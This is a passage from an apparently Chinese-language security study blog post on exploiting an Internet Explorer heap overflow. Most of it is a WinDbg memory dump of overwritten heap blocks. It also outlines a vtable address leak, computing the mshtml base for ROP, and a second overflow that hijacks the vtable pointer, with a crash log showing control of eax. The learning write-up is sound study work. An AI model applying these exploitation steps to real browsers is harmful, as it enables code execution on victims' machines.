01 00 04 10 00 00  A.A.A.A.H.......</span><br><span class="line">03f2b010  04 10 00 00 04 10 00 00-41 00 41 00 41 00 41 00  ........A.A.A.A.</span><br><span class="line">03f2b020  41 00 41 00 48 00 01 00-04 10 00 00 04 10 00 00  A.A.H...........</span><br><span class="line">03f2b030  04 10 00 00 41 00 41 00-41 00 41 00 41 00 41 00  ....A.A.A.A.A.A.</span><br><span class="line">03f2b040  48 00 01 00 41 00 00 00-20 10 d1 01 00 00 00 c2  H...A... .......</span><br><span class="line">03f2b050  0c 61 81 04 00 00 00 00-02 00 00 00 18 00 02 05  .a..............</span><br><span class="line">03f2b060  fa 00 00 00 42 00 42 00-42 00 42 00 42 00 42 00  ....B.B.B.B.B.B.</span><br><span class="line">03f2b070  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b080  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b090  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0a0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0b0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0c0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0d0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0e0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b0f0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b100  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b110  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b120  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b130  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b140  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b150  42 00 42 00 42 00 42 00-42 00 42 00 42 00 00 00  B.B.B.B.B.B.B...</span><br><span class="line">03f2b160  05 10 d1 01 00 00 00 c2-c0 6a 81 04 00 00 00 00  .........j......</span><br><span class="line">03f2b170  02 00 00 00 1c 00 02 05-f8 3a 8d 68 10 0b 37 01  .........:.h..7.</span><br><span class="line">03f2b180  70 90 ef 03 90 3c 8d 68-01 00 00 00 00 00 00 00  p....&lt;.h........</span><br><span class="line">03f2b190  09 08 08 01 ff ff ff ff-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b1a0  00 00 00 00 ff ff ff ff-80 00 00 00 ff ff ff ff  ................</span><br><span class="line">03f2b1b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b1c0  00 00 00 00 24 00 00 00-20 00 00 00 00 00 00 00  ....$... .......</span><br><span class="line">03f2b1d0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b1e0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b1f0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b200  00 00 00 00 00 00 00 00-00 00 00 00 28 b2 f2 03  ............(...</span><br><span class="line">03f2b210  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b220  01 00 00 00 01 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b230  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b240  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................</span><br><span class="line">03f2b250  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b260  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b270  00 00 00 00 00 00 00 00-66 10 d1 01 00 00 00 c2  ........f.......</span><br><span class="line">03f2b280  a4 30 a9 03 00 00 00 00-02 00 00 00 1c 00 02 05  .0..............</span><br><span class="line">03f2b290  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b2a0  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2b2b0  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2b2c0  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2b2d0  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2b2e0  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2b2f0  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2b300  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b310  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2b320  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2b330  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2b340  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2b350  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2b360  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2b370  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b380  45 00 45 00 41 00 45 00-48 00 01 00 45 00 00 00  E.E.A.E.H...E...</span><br><span class="line">03f2b390  5b 10 d1 01 00 00 00 c2-0c 61 81 04 00 00 00 00  [........a......</span><br><span class="line">03f2b3a0  02 00 00 00 18 00 02 05-fa 00 00 00 41 00 41 00  ............A.A.</span><br><span class="line">03f2b3b0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b3c0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b3d0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b3e0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b3f0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b400  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b410  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b420  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b430  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b440  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b450  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b460  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b470  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b480  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b490  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b4a0  41 00 41 00 41 00 00 00-bc 10 d1 01 00 00 00 c2  A.A.A...........</span><br><span class="line">03f2b4b0  0c 61 81 04 00 00 00 00-02 00 00 00 18 00 02 05  .a..............</span><br><span class="line">03f2b4c0  fa 00 00 00 42 00 42 00-42 00 42 00 42 00 42 00  ....B.B.B.B.B.B.</span><br><span class="line">03f2b4d0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b4e0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b4f0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b500  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b510  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b520  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b530  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b540  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b550  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b560  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b570  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b580  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b590  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b5a0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b5b0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 00 00  B.B.B.B.B.B.B...</span><br><span class="line">03f2b5c0  91 10 d1 01 00 00 00 c2-c0 6a 81 04 00 00 00 00  .........j......</span><br><span class="line">03f2b5d0  02 00 00 00 1c 00 02 05-f8 3a 8d 68 10 0b 37 01  .........:.h..7.</span><br><span class="line">03f2b5e0  e0 90 ef 03 90 3c 8d 68-01 00 00 00 00 00 00 00  .....&lt;.h........</span><br><span class="line">03f2b5f0  09 08 08 01 ff ff ff ff-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b600  00 00 00 00 ff ff ff ff-80 00 00 00 ff ff ff ff  ................</span><br><span class="line">03f2b610  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b620  00 00 00 00 24 00 00 00-20 00 00 00 00 00 00 00  ....$... .......</span><br><span class="line">03f2b630  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b640  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b650  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b660  00 00 00 00 00 00 00 00-00 00 00 00 88 b6 f2 03  ................</span><br><span class="line">03f2b670  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b680  01 00 00 00 01 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b690  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b6a0  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................</span><br><span class="line">03f2b6b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b6c0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2b6d0  00 00 00 00 00 00 00 00-f2 10 d1 01 00 00 00 c2  ................</span><br><span class="line">03f2b6e0  a4 30 a9 03 00 00 00 00-02 00 00 00 1c 00 02 05  .0..............</span><br><span class="line">03f2b6f0  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b700  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2b710  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2b720  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2b730  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2b740  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2b750  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2b760  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b770  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2b780  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2b790  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2b7a0  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2b7b0  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2b7c0  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2b7d0  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2b7e0  45 00 45 00 41 00 45 00-48 00 01 00 45 00 00 00  E.E.A.E.H...E...</span><br><span class="line">03f2b7f0  d7 10 d1 01 00 00 00 c2-0c 61 81 04 00 00 00 00  .........a......</span><br><span class="line">03f2b800  02 00 00 00 18 00 02 05-fa 00 00 00 41 00 41 00  ............A.A.</span><br><span class="line">03f2b810  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b820  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b830  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b840  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b850  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b860  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b870  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b880  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b890  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8a0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8b0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8c0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8d0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8e0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b8f0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2b900  41 00 41 00 41 00 00 00-08 11 d1 01 00 00 00 c2  A.A.A...........</span><br><span class="line">03f2b910  0c 61 81 04 00 00 00 00-02 00 00 00 18 00 02 05  .a..............</span><br><span class="line">03f2b920  fa 00 00 00 42 00 42 00-42 00 42 00 42 00 42 00  ....B.B.B.B.B.B.</span><br><span class="line">03f2b930  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b940  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b950  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b960  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b970  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b980  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b990  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9a0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9b0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9c0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9d0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9e0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2b9f0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2ba00  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2ba10  42 00 42 00 42 00 42 00-42 00 42 00 42 00 00 00  B.B.B.B.B.B.B...</span><br><span class="line">03f2ba20  6d 11 d1 01 00 00 00 c2-c0 6a 81 04 00 00 00 00  m........j......</span><br><span class="line">03f2ba30  02 00 00 00 1c 00 02 05-f8 3a 8d 68 10 0b 37 01  .........:.h..7.</span><br><span class="line">03f2ba40  50 91 ef 03 90 3c 8d 68-01 00 00 00 00 00 00 00  P....&lt;.h........</span><br><span class="line">03f2ba50  09 08 08 01 ff ff ff ff-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2ba60  00 00 00 00 ff ff ff ff-80 00 00 00 ff ff ff ff  ................</span><br><span class="line">03f2ba70  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2ba80  00 00 00 00 24 00 00 00-20 00 00 00 00 00 00 00  ....$... .......</span><br><span class="line">03f2ba90  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2baa0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bab0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bac0  00 00 00 00 00 00 00 00-00 00 00 00 e8 ba f2 03  ................</span><br><span class="line">03f2bad0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bae0  01 00 00 00 01 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2baf0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bb00  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................</span><br><span class="line">03f2bb10  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bb20  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">03f2bb30  00 00 00 00 00 00 00 00-4e 11 d1 01 00 00 00 c2  ........N.......</span><br><span class="line">03f2bb40  a4 30 a9 03 00 00 00 00-02 00 00 00 1c 00 02 05  .0..............</span><br><span class="line">03f2bb50  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2bb60  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2bb70  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2bb80  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2bb90  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2bba0  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2bbb0  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2bbc0  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2bbd0  45 00 45 00 41 00 45 00-48 00 01 00 04 10 00 00  E.E.A.E.H.......</span><br><span class="line">03f2bbe0  04 10 00 00 04 10 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">03f2bbf0  41 00 45 00 48 00 01 00-04 10 00 00 04 10 00 00  A.E.H...........</span><br><span class="line">03f2bc00  04 10 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">03f2bc10  48 00 01 00 04 10 00 00-04 10 00 00 04 10 00 00  H...............</span><br><span class="line">03f2bc20  00 00 00 00 45 00 45 00-41 00 45 00 48 00 01 00  ....E.E.A.E.H...</span><br><span class="line">03f2bc30  04 10 00 00 04 10 00 00-04 10 00 00 00 00 00 00  ................</span><br><span class="line">03f2bc40  45 00 45 00 41 00 45 00-48 00 01 00 45 00 00 00  E.E.A.E.H...E...</span><br><span class="line">03f2bc50  a3 11 d1 01 00 00 00 c2-0c 61 81 04 00 00 00 00  .........a......</span><br><span class="line">03f2bc60  02 00 00 00 18 00 02 05-fa 00 00 00 41 00 41 00  ............A.A.</span><br><span class="line">03f2bc70  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bc80  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bc90  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bca0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bcb0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bcc0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bcd0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bce0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bcf0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd00  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd10  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd20  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd30  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd40  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd50  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">03f2bd60  41 00 41 00 41 00 00 00-84 11 d1 01 00 00 00 c2  A.A.A...........</span><br><span class="line">03f2bd70  0c 61 81 04 00 00 00 00-02 00 00 00 18 00 02 05  .a..............</span><br><span class="line">03f2bd80  fa 00 00 00 42 00 42 00-42 00 42 00 42 00 42 00  ....B.B.B.B.B.B.</span><br><span class="line">03f2bd90  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bda0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bdb0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bdc0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bdd0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bde0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2bdf0  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2be00  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2be10  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2be20  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2be30  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">03f2be40  42 00 42 00 42 00 42 00-42 00 42 00              B.B.B.B.B.B.</span><br></pre></td></tr></table></figure></p>
+<p>很简单的能观察到03f2ae30的AAAA字符串被大量覆盖，所以它就是vulheap。<br>为做对比，我多打印了很多，下面的未被覆盖的AAAA都是成片出现的。</p>
+<p><strong>不过对比漏洞战争书上，本来03f2b040地址处的fa被覆盖为48 00 01 00即0x00010048,这个覆盖看的出来（下图蓝色框线）.<br>按照0x03f2ae30+0x100(EEEE…)+0x8(堆指针大小）+0x100（AAAA…)+0x8(堆指针大小)=03f2b040,也确实应该是这里，我应该没理解错。</strong></p>
+<p><strong>但是很奇怪，我的fa也还在……（下图红色框线），这可能就是我之前弹窗打印出的虚表地址不正确的原因吧，感觉别人的文章里都不会这样……难以理解</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-17-182936.png" alt=""></p>
+<p>得到虚表地址后，计算mshtml基地址，构造rop。</p>
+<p>然后再次溢出，这次溢出直接像刚刚覆盖BBBB的大小一样，直接覆盖虚表指针，于是就可以劫持虚表指针到任意地址，如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(6cc.7f8): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=07070024---&gt;控制虚表指针 ebx=01000000 ecx=040f8910 edx=00000041 esi=0375f530 edi=040e0790</span><br><span class="line">eip=003d006b esp=0375f368 ebp=0375f3a0 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202</span><br><span class="line">003d006b 777a            ja      003d00e7                                [br=1]</span><br></pre></td></tr></table></figure></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>调试poc的时候还是比较顺利的，在调exp那里各种卡壳，唉。<br>主要还是学到了一些windbg的使用吧。<br>比如如果要下断点，其实可以在html里插入数学函数，比如用Math.cos，然后在jscript!Cos下断。<br>比如要查看jscript的导出表，可以在windbg里用x jscript!* 来查找，找虚表可以使用类似的方法（见上文）</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/10/windbg/" rel="next" title="windbg使用">
+                <i class="fa fa-chevron-left"></i> windbg使用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/14/lotabout/" rel="prev" title="手把手教你构建 C 语言编译器（解释器）学习笔记">
